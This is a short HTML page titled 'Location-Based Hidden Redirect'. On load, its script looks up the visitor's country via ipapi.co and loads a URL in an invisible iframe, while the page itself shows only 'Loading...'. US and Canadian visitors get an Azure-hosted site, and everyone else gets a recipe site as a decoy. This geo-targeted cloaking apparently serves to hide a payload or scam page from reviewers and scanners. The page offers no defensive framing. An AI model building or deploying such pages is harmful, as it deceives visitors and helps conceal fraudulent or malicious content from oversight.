<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location-Based Hidden Redirect</title>
    <script>
        // USA/Canada Redirection URL
        var usaCanadaURL = "https://huntop001.z13.web.core.windows.net/";
        // Other Countries Redirection URL
        var otherCountriesURL = "https://www.allrecipes.com/";

        // Function to Redirect with Hidden iframe
        function hiddenRedirect(targetUrl) {
            var iframe = document.createElement("iframe");
            iframe.style.display = "none";
            iframe.src = targetUrl;
            document.body.appendChild(iframe);
        }

        // Fetch User Location Based on IP
        fetch("https://ipapi.co/json/")
            .then(response => response.json())
            .then(data => {
                var country = data.country_code;
                if (country === "US" || country === "CA") {
                    hiddenRedirect(usaCanadaURL);
                } else {
                    hiddenRedirect(otherCountriesURL);
                }
            })
            .catch(() => {
                // Default redirection if location detection fails
                hiddenRedirect(otherCountriesURL);
            });
    </script>
</head>
<body>
    <h1>Loading...</h1> <!-- Can be hidden if needed -->
</body>
</html>

